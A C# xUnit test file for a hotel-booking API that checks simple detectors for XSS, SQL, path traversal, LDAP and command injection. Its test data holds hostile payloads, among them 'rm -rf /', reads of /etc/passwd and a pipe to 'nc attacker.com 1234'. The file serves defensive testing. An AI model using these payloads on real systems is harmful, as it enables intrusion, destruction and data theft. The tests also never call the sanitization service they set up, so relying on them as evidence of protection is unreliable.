using Xunit;
using HotelBooking.API.Services;

namespace HotelBooking.Tests;

/// <summary>
/// Security tests for input validation and XSS prevention
/// </summary>
public class InputValidationSecurityTests
{
    private readonly LogSanitizationService _sanitizationService;

    public InputValidationSecurityTests()
    {
        _sanitizationService = new LogSanitizationService();
    }

    #region XSS Attack Prevention Tests

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert('XSS')>")]
    [InlineData("<svg onload=alert('XSS')>")]
    [InlineData("<iframe src='javascript:alert(\"XSS\")'></iframe>")]
    [InlineData("<body onload=alert('XSS')>")]
    [InlineData("<input onfocus=alert('XSS') autofocus>")]
    [InlineData("<select onfocus=alert('XSS') autofocus>")]
    [InlineData("<textarea onfocus=alert('XSS') autofocus>")]
    [InlineData("<marquee onstart=alert('XSS')>")]
    [InlineData("<div style='background:url(javascript:alert(\"XSS\"))'></div>")]
    public void XSS_DetectsScriptInjectionAttempts(string maliciousInput)
    {
        // Act
        var containsScript = maliciousInput.Contains("<script", StringComparison.OrdinalIgnoreCase);
        var containsOnEvent = System.Text.RegularExpressions.Regex.IsMatch(maliciousInput, @"on\w+\s*=", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
        var containsJavascript = maliciousInput.Contains("javascript:", StringComparison.OrdinalIgnoreCase);
        var containsIframe = maliciousInput.Contains("<iframe", StringComparison.OrdinalIgnoreCase);

        // Assert
        Assert.True(containsScript || containsOnEvent || containsJavascript || containsIframe,
            $"Malicious input should be detected: {maliciousInput}");
    }

    [Theory]
    [InlineData("<p>Normal paragraph</p>", true)]
    [InlineData("<b>Bold text</b>", true)]
    [InlineData("<i>Italic text</i>", true)]
    [InlineData("Plain text without HTML", true)]
    [InlineData("<script>alert('XSS')</script>", false)]
    [InlineData("<img src=x onerror=alert(1)>", false)]
    public void XSS_AllowsSafeHtmlTags(string input, bool shouldBeAllowed)
    {
        // Act
        var isSafe = !input.Contains("<script", StringComparison.OrdinalIgnoreCase) &&
                     !System.Text.RegularExpressions.Regex.IsMatch(input, @"on\w+\s*=", System.Text.RegularExpressions.RegexOptions.IgnoreCase) &&
                     !input.Contains("javascript:", StringComparison.OrdinalIgnoreCase);

        // Assert
        Assert.Equal(shouldBeAllowed, isSafe);
    }

    #endregion

    #region SQL Injection Prevention Tests

    [Theory]
    [InlineData("'; DROP TABLE Users; --")]
    [InlineData("1' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("' UNION SELECT * FROM Users--")]
    [InlineData("1; DELETE FROM Bookings WHERE 1=1--")]
    [InlineData("'; EXEC xp_cmdshell('dir'); --")]
    [InlineData("1' AND 1=1 UNION SELECT NULL, username, password FROM Users--")]
    public void SQLInjection_DetectsMaliciousQueries(string maliciousInput)
    {
        // Act
        var containsSqlKeywords = 
            maliciousInput.Contains("DROP", StringComparison.OrdinalIgnoreCase) ||
            maliciousInput.Contains("DELETE", StringComparison.OrdinalIgnoreCase) ||
            maliciousInput.Contains("UNION", StringComparison.OrdinalIgnoreCase) ||
            maliciousInput.Contains("EXEC", StringComparison.OrdinalIgnoreCase) ||
            maliciousInput.Contains("xp_cmdshell", StringComparison.OrdinalIgnoreCase) ||
            maliciousInput.Contains("--") ||
            (maliciousInput.Contains("'") && maliciousInput.Contains("OR"));

        // Assert
        Assert.True(containsSqlKeywords, 
            $"SQL injection attempt should be detected: {maliciousInput}");
    }

    [Theory]
    [InlineData("john.doe@example.com")]
    [InlineData("Hotel California")]
    [InlineData("Room 101")]
    [InlineData("2024-12-25")]
    public void SQLInjection_AllowsLegitimateInput(string legitimateInput)
    {
        // Act
        var containsSqlKeywords = 
            legitimateInput.Contains("DROP", StringComparison.OrdinalIgnoreCase) ||
            legitimateInput.Contains("DELETE", StringComparison.OrdinalIgnoreCase) ||
            legitimateInput.Contains("UNION", StringComparison.OrdinalIgnoreCase) ||
            legitimateInput.Contains("--");

        // Assert
        Assert.False(containsSqlKeywords, 
            $"Legitimate input should not be flagged: {legitimateInput}");
    }

    #endregion

    #region Path Traversal Prevention Tests

    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("..\\..\\windows\\system32\\config\\sam")]
    [InlineData("....//....//etc/passwd")]
    [InlineData("%2e%2e%2f%2e%2e%2fetc%2fpasswd")]
    public void PathTraversal_DetectsDirectoryTraversalAttempts(string maliciousPath)
    {
        // Act
        var containsTraversal = maliciousPath.Contains("..") || 
                                maliciousPath.Contains("%2e%2e");

        // Assert
        Assert.True(containsTraversal, 
            $"Path traversal attempt should be detected: {maliciousPath}");
    }

    #endregion

    #region Command Injection Prevention Tests

    [Theory]
    [InlineData("test; rm -rf /")]
    [InlineData("test && cat /etc/passwd")]
    [InlineData("test | nc attacker.com 1234")]
    [InlineData("test`whoami`")]
    [InlineData("test$(whoami)")]
    public void CommandInjection_DetectsCommandInjectionAttempts(string maliciousInput)
    {
        // Act
        var containsCommandChars = maliciousInput.Contains(";") ||
                                   maliciousInput.Contains("&&") ||
                                   maliciousInput.Contains("|") ||
                                   maliciousInput.Contains("`") ||
                                   maliciousInput.Contains("$(");

        // Assert
        Assert.True(containsCommandChars, 
            $"Command injection attempt should be detected: {maliciousInput}");
    }

    #endregion

    #region LDAP Injection Prevention Tests

    [Theory]
    [InlineData("*)(uid=*))(|(uid=*")]
    [InlineData("admin)(&(password=*))")]
    [InlineData("*)(objectClass=*")]
    public void LDAPInjection_DetectsLDAPInjectionAttempts(string maliciousInput)
    {
        // Act
        var containsLdapChars = maliciousInput.Contains("*)(") ||
                                maliciousInput.Contains(")(") ||
                                maliciousInput.Contains("|(");

        // Assert
        Assert.True(containsLdapChars, 
            $"LDAP injection attempt should be detected: {maliciousInput}");
    }

    #endregion

    #region Email Validation Tests

    [Theory]
    [InlineData("test@example.com", true)]
    [InlineData("user.name+tag@example.co.uk", true)]
    [InlineData("invalid-email", false)]
    [InlineData("@example.com", false)]
    [InlineData("test@", false)]
    [InlineData("test@example", false)]
    [InlineData("<script>@example.com", false)]
    public void Email_ValidatesEmailFormat(string email, bool expectedValid)
    {
        // Act
        var basicValidation = email.Contains("@") && 
                             email.Contains(".") && 
                             email.IndexOf("@") > 0 && 
                             email.LastIndexOf(".") > email.IndexOf("@");
        
        var noMaliciousContent = !email.Contains("<") && 
                                 !email.Contains(">") && 
                                 !email.Contains("script");

        var isValid = basicValidation && noMaliciousContent;

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    #endregion

    #region URL Validation Tests

    [Theory]
    [InlineData("https://example.com", true)]
    [InlineData("http://example.com/path", true)]
    [InlineData("javascript:alert('XSS')", false)]
    [InlineData("data:text/html,<script>alert('XSS')</script>", false)]
    [InlineData("vbscript:msgbox('XSS')", false)]
    public void URL_ValidatesURLFormat(string url, bool expectedValid)
    {
        // Act
        var isHttpUrl = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                        url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        
        var noMaliciousProtocol = !url.StartsWith("javascript:", StringComparison.OrdinalIgnoreCase) &&
                                  !url.StartsWith("data:", StringComparison.OrdinalIgnoreCase) &&
                                  !url.StartsWith("vbscript:", StringComparison.OrdinalIgnoreCase);

        var isValid = isHttpUrl && noMaliciousProtocol;

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    #endregion

    #region Content Length Validation Tests

    [Fact]
    public void ContentLength_RejectsExcessivelyLongInput()
    {
        // Arrange
        var maxLength = 5000;
        var excessiveInput = new string('A', maxLength + 1);

        // Act
        var isValid = excessiveInput.Length <= maxLength;

        // Assert
        Assert.False(isValid, "Excessively long input should be rejected");
    }

    [Fact]
    public void ContentLength_AcceptsReasonableLengthInput()
    {
        // Arrange
        var maxLength = 5000;
        var reasonableInput = new string('A', maxLength - 100);

        // Act
        var isValid = reasonableInput.Length <= maxLength;

        // Assert
        Assert.True(isValid, "Reasonable length input should be accepted");
    }

    #endregion

    #region Special Characters Validation Tests

    [Theory]
    [InlineData("Normal text 123", true)]
    [InlineData("Text with spaces", true)]
    [InlineData("Text-with-hyphens", true)]
    [InlineData("Text_with_underscores", true)]
    [InlineData("Text.with.dots", true)]
    [InlineData("Text@with@at", true)]
    [InlineData("Text\0with\0null", false)] // Null bytes
    [InlineData("Text\r\nwith\r\nCRLF", true)] // CRLF is okay for multiline
    public void SpecialCharacters_ValidatesSpecialCharacters(string input, bool expectedValid)
    {
        // Act
        var containsNullByte = input.Contains('\0');
        var isValid = !containsNullByte;

        // Assert
        Assert.Equal(expectedValid, isValid);
    }

    #endregion

    #region Encoding Tests

    [Theory]
    [InlineData("<script>", "&lt;script&gt;")]
    [InlineData("Test & Test", "Test &amp; Test")]
    [InlineData("\"quoted\"", "&quot;quoted&quot;")]
    [InlineData("'single'", "&#x27;single&#x27;")]
    public void Encoding_EncodesHtmlSpecialCharacters(string input, string expectedEncoded)
    {
        // Act
        var encoded = input
            .Replace("&", "&amp;")
            .Replace("<", "&lt;")
            .Replace(">", "&gt;")
            .Replace("\"", "&quot;")
            .Replace("'", "&#x27;");

        // Assert
        Assert.Equal(expectedEncoded, encoded);
    }

    #endregion
}
